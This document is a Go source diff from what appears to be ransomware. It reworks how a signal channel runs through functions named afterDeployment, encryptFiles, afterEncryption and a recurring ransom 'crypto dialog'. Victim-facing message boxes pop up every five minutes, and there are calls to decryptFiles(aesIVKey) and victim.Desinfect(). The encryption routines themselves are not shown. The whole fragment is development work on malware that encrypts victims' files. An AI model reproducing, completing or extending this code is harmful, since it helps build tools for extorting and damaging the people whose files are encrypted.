@@ -40,7 +40,7 @@ func main() {
     afterDeployment(sig)
 }
 
-func dialog() {
+func dialog(sig chan os.Signal) {
     // crypto dialog
     win.MessageBox(
         "Ooopsies!!!!!!!",
@@ -104,12 +104,13 @@ func dialog() {
             win.MB_OK | win.MB_ICONEXCLAMATION,
         )
         decryptFiles(aesIVKey)
-        victim.Desinfect()
         win.MessageBox(
             "WOOHOOOOOOO",
             "ALL DONE, HAVE A GOOD ONE MATE",
             win.MB_OK | win.MB_ICONEXCLAMATION,
         )
+        victim.Desinfect()
+        close(sig)
     case win.IDNO:
         win.MessageBox(
             "No worries mate!",
@@ -119,7 +120,7 @@ func dialog() {
     }
 }
 
-func beforeDeployment(sig <-chan os.Signal) {
+func beforeDeployment(sig chan os.Signal) {
     for {
         select {
         case <-sig:
@@ -132,7 +133,7 @@ func beforeDeployment(sig <-chan os.Signal) {
     }
 }
 
-func afterDeployment(sig <-chan os.Signal) {
+func afterDeployment(sig chan os.Signal) {
     done := make(chan struct{})
     go encryptFiles(done)
     for {
@@ -145,14 +146,14 @@ func afterDeployment(sig <-chan os.Signal) {
     }
 }
 
-func afterEncryption(sig <-chan os.Signal) {
-    go dialog()
+func afterEncryption(sig chan os.Signal) {
+    go dialog(sig)
     for {
         select {
         case <-sig:
             return
         case <-time.After(5 * time.Minute):
-            go dialog()
+            go dialog(sig)
         }
     }
 }
